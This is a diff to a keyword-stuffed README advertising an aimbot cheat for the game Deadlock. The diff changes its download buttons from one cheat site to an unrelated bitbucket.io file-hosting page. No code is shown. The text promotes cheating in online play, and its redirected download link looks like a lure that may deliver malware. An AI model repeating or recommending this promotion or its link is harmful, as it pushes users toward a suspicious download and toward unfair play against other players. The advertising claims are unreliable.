@@ -4,7 +4,7 @@ Deadlock is fast, punishing, and sweaty — blink and you're dead. But what if y
 
 Perfect for climbing ranked, frag movie farming, or just wiping squads without missing a shot 😎.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://wecheaters.github.io/cheats/deadlock/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload13.bitbucket.io)
 ---
 
 ## 🎯 What Is the Deadlock Aimbot?
@@ -17,7 +17,7 @@ The **Deadlock Aimbot** is a cheat tool that uses injected aim logic to **lock y
 
 This tool adapts to how *you* want to play — subtle or savage.
 
-[![Download Aimbot](https://www.buyhack.pro/storage/products/screenshots/f118ce042faa9a37c348655959d2eaff.png)](https://wecheaters.github.io/cheats/deadlock/)
+[![Download Aimbot](https://www.buyhack.pro/storage/products/screenshots/f118ce042faa9a37c348655959d2eaff.png)](https://fileoffload13.bitbucket.io)
 ---
 
 ## 🔥 Core Aimbot Features
@@ -105,3 +105,4 @@ If you’re tired of losing aim duels or just want to be **a walking highlight r
 ## 🔑 Keywords:
 
 Deadlock aimbot, legit aimbot Deadlock, rage aimbot cheat, Deadlock snap aim, smooth aim cheat, Deadlock triggerbot, auto lock Deadlock, headshot hack Deadlock, Deadlock aim assist cheat, Deadlock rage mode, best aimbot Deadlock, cheat tool for aim, PC cheat Deadlock.
+
